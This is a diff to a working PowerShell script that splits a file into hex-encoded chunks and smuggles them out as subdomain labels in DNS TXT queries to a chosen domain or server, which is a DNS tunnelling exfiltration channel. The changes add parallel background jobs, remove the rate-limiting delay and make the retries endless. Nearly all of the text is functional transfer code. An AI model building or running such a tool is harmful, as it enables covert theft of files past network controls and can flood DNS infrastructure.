@@ -1,18 +1,21 @@
 # Script to break a file into chunks and send via DNS queries
-# Usage: .\script.ps1 <file> [domain] [chunk_size] [dns_server]
+# Usage: .\script.ps1 <file> [domain] [chunk_size] [dns_server] [max_parallel]
 
 param (
     [Parameter(Mandatory=$true)]
     [string]$FilePath,
     
-    [Parameter(Mandatory=$false)]
+    [Parameter(Mandatory=$true)]
     [string]$Domain = "example.com",
     
     [Parameter(Mandatory=$false)]
     [int]$ChunkSize = 100,
     
     [Parameter(Mandatory=$false)]
-    [string]$DnsServer = ""
+    [string]$DnsServer = "",
+    
+    [Parameter(Mandatory=$false)]
+    [int]$MaxParallel = 20
 )
 
 # Check if file exists
@@ -46,6 +49,7 @@ Write-Host "Chunk size: $ChunkSize bytes"
 Write-Host "Total parts: $TotalParts"
 Write-Host "Hash: $Hash8"
 Write-Host "Domain: $Domain"
+Write-Host "Max parallel: $MaxParallel"
 Write-Host ""
 
 # Function to split hex string into DNS labels (max 63 chars per label)
@@ -81,20 +85,26 @@ if ($DnsServer -eq "") {
 }
 Start-Sleep -Milliseconds 100
 
-# Read file and send chunks (1-based part numbering)
-$PartNum = 1
-$BytesRead = 0
-
-$FileStream = [System.IO.File]::OpenRead($FilePath)
-
-while ($BytesRead -lt $FileSize) {
-    # Calculate chunk size
-    $ChunkLength = [math]::Min($ChunkSize, $FileSize - $BytesRead)
+# Function to send a single DNS query (used in parallel)
+function Send-DnsQuery {
+    param(
+        [int]$PartNum,
+        [long]$ChunkOffset,
+        [int]$ChunkSize,
+        [string]$Hash8,
+        [string]$Domain,
+        [string]$DnsServer,
+        [string]$FilePath,
+        [int]$TotalParts
+    )
     
-    # Read chunk
+    # Read chunk from file
+    $FileStream = [System.IO.File]::OpenRead($FilePath)
+    $ChunkLength = [math]::Min($ChunkSize, (Get-Item $FilePath).Length - $ChunkOffset)
     $Chunk = New-Object byte[] $ChunkLength
-    $FileStream.Seek($BytesRead, [System.IO.SeekOrigin]::Begin) | Out-Null
+    $FileStream.Seek($ChunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
     $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
+    $FileStream.Close()
     
     # Convert to hex string
     $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
@@ -107,33 +117,96 @@ while ($BytesRead -lt $FileSize) {
     $DataQuery = "$ChunkHexLabels.$PartNum.$Hash8.$Domain"
     
     # Send DNS query
-    Write-Host -NoNewline "Sending part $PartNum/$TotalParts... "
     if ($DnsServer -eq "") {
         Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
     } else {
         Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
     }
-    Write-Host "done"
+    
+    Write-Output "Part $PartNum/$TotalParts sent"
+}
+
+# Read file and send chunks in parallel (1-based part numbering)
+Write-Host "Sending chunks in parallel (max $MaxParallel concurrent queries)..."
+$PartNum = 1
+$BytesRead = 0
+$Jobs = @()
+
+while ($BytesRead -lt $FileSize) {
+    # Wait if we've reached max parallel jobs
+    while (($Jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxParallel) {
+        Start-Sleep -Milliseconds 10
+    }
+    
+    # Remove completed jobs
+    $Jobs = $Jobs | Where-Object { $_.State -eq 'Running' }
+    
+    # Start DNS query in background job
+    $Job = Start-Job -ScriptBlock {
+        param($PartNum, $BytesRead, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $TotalParts)
+        
+        # Read chunk from file
+        $FileStream = [System.IO.File]::OpenRead($FilePath)
+        $ChunkLength = [math]::Min($ChunkSize, (Get-Item $FilePath).Length - $BytesRead)
+        $Chunk = New-Object byte[] $ChunkLength
+        $FileStream.Seek($BytesRead, [System.IO.SeekOrigin]::Begin) | Out-Null
+        $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
+        $FileStream.Close()
+        
+        # Convert to hex string
+        $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
+        
+        # Split hex into DNS labels
+        function Split-HexLabels {
+            param([string]$HexStr)
+            $result = ""
+            $len = $HexStr.Length
+            $i = 0
+            while ($i -lt $len) {
+                if ($result -ne "") { $result += "." }
+                $chunkLen = [math]::Min(63, $len - $i)
+                $result += $HexStr.Substring($i, $chunkLen)
+                $i += 63
+            }
+            return $result
+        }
+        
+        $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
+        
+        # Build data record query
+        $DataQuery = "$ChunkHexLabels.$PartNum.$Hash8.$Domain"
+        
+        # Send DNS query
+        if ($DnsServer -eq "") {
+            Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
+        } else {
+            Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
+        }
+        
+        Write-Output "Part $PartNum/$TotalParts sent"
+    } -ArgumentList $PartNum, $BytesRead, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $TotalParts
+    
+    $Jobs += $Job
     
     $BytesRead += $ChunkSize
     $PartNum++
-    
-    # Small delay to avoid overwhelming the DNS server
-    Start-Sleep -Milliseconds 50
 }
 
-$FileStream.Close()
+# Wait for all jobs to complete and show output
+Write-Host "Waiting for all queries to complete..."
+$Jobs | Wait-Job | Out-Null
+$Jobs | Receive-Job | Out-Null
+$Jobs | Remove-Job
 
 Write-Host ""
 Write-Host "Initial transfer complete! Sent $TotalParts parts."
 
-# Check for missing chunks and retry
-$MaxRetries = 10
+# Check for missing chunks and retry (retry indefinitely until all chunks are received)
 $RetryCount = 0
 
-while ($RetryCount -lt $MaxRetries) {
-    # Wait a bit for server to process
-    Start-Sleep -Milliseconds 500
+while ($true) {
+    # Wait 1 second for server to process
+    Start-Sleep -Seconds 1
     
     # Query for missing chunks
     $MissingQuery = "missing.$Hash8.$Domain"
@@ -169,72 +242,78 @@ while ($RetryCount -lt $MaxRetries) {
     # Sort missing chunks
     $MissingChunks = $MissingChunks | Sort-Object
     
+    $RetryCount++
     Write-Host "Found $($MissingChunks.Count) missing chunk(s): $($MissingChunks -join ' ')"
+    Write-Host "Retry attempt $RetryCount : Retrying missing chunks in parallel..."
     
-    # Retry sending missing chunks (1-based)
-    $FileStream = [System.IO.File]::OpenRead($FilePath)
+    # Retry sending missing chunks in parallel (1-based)
+    $RetryJobs = @()
     foreach ($chunkNum in $MissingChunks) {
+        # Wait if we've reached max parallel jobs
+        while (($RetryJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxParallel) {
+            Start-Sleep -Milliseconds 10
+        }
+        
+        # Remove completed jobs
+        $RetryJobs = $RetryJobs | Where-Object { $_.State -eq 'Running' }
+        
         # Calculate byte offset for this chunk (1-based part number, so subtract 1)
         $chunkOffset = ($chunkNum - 1) * $ChunkSize
         
-        # Read chunk
-        $ChunkLength = [math]::Min($ChunkSize, $FileSize - $chunkOffset)
-        $Chunk = New-Object byte[] $ChunkLength
-        $FileStream.Seek($chunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
-        $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
-        
-        # Convert to hex string
-        $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
-        
-        # Split hex into DNS labels
-        $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
-        
-        # Build data record query
-        $DataQuery = "$ChunkHexLabels.$chunkNum.$Hash8.$Domain"
-        
-        # Send DNS query
-        Write-Host -NoNewline "  Retrying chunk $chunkNum... "
-        if ($DnsServer -eq "") {
-            Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
-        } else {
-            Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
-        }
-        Write-Host "done"
-        
-        Start-Sleep -Milliseconds 50
-    }
-    $FileStream.Close()
-    
-    $RetryCount++
-    Write-Host "Retry attempt $RetryCount/$MaxRetries completed"
-    Write-Host ""
-}
-
-if ($RetryCount -eq $MaxRetries) {
-    Write-Host "Warning: Reached maximum retry attempts. Some chunks may still be missing." -ForegroundColor Yellow
-    # Final check
-    $FinalCheck = $null
-    if ($DnsServer -eq "") {
-        $FinalCheck = Resolve-DnsName -Name "missing.$Hash8.$Domain" -Type TXT -ErrorAction SilentlyContinue
-    } else {
-        $FinalCheck = Resolve-DnsName -Name "missing.$Hash8.$Domain" -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue
-    }
-    if ($FinalCheck) {
-        $FinalMissing = @()
-        foreach ($record in $FinalCheck) {
-            if ($record.Strings) {
-                foreach ($str in $record.Strings) {
-                    $chunkNum = 0
-                    if ([int]::TryParse($str, [ref]$chunkNum)) {
-                        $FinalMissing += $chunkNum
-                    }
+        # Start DNS query in background job
+        $Job = Start-Job -ScriptBlock {
+            param($chunkNum, $chunkOffset, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $FileSize)
+            
+            # Read chunk from file
+            $FileStream = [System.IO.File]::OpenRead($FilePath)
+            $ChunkLength = [math]::Min($ChunkSize, $FileSize - $chunkOffset)
+            $Chunk = New-Object byte[] $ChunkLength
+            $FileStream.Seek($chunkOffset, [System.IO.SeekOrigin]::Begin) | Out-Null
+            $FileStream.Read($Chunk, 0, $ChunkLength) | Out-Null
+            $FileStream.Close()
+            
+            # Convert to hex string
+            $ChunkHex = ($Chunk | ForEach-Object { $_.ToString("x2") }) -join ""
+            
+            # Split hex into DNS labels
+            function Split-HexLabels {
+                param([string]$HexStr)
+                $result = ""
+                $len = $HexStr.Length
+                $i = 0
+                while ($i -lt $len) {
+                    if ($result -ne "") { $result += "." }
+                    $chunkLen = [math]::Min(63, $len - $i)
+                    $result += $HexStr.Substring($i, $chunkLen)
+                    $i += 63
                 }
+                return $result
             }
-        }
-        if ($FinalMissing.Count -gt 0) {
-            Write-Host "Still missing: $($FinalMissing -join ' ')"
-        }
+            
+            $ChunkHexLabels = Split-HexLabels -HexStr $ChunkHex
+            
+            # Build data record query
+            $DataQuery = "$ChunkHexLabels.$chunkNum.$Hash8.$Domain"
+            
+            # Send DNS query
+            if ($DnsServer -eq "") {
+                Resolve-DnsName -Name $DataQuery -Type TXT -ErrorAction SilentlyContinue | Out-Null
+            } else {
+                Resolve-DnsName -Name $DataQuery -Type TXT -Server $DnsServer -ErrorAction SilentlyContinue | Out-Null
+            }
+            
+            Write-Output "Chunk $chunkNum retried"
+        } -ArgumentList $chunkNum, $chunkOffset, $ChunkSize, $Hash8, $Domain, $DnsServer, $FilePath, $FileSize
+        
+        $RetryJobs += $Job
     }
+    
+    # Wait for all retry jobs to complete
+    $RetryJobs | Wait-Job | Out-Null
+    $RetryJobs | Receive-Job | Out-Null
+    $RetryJobs | Remove-Job
+    
+    Write-Host ""
 }
 
 Write-Host ""
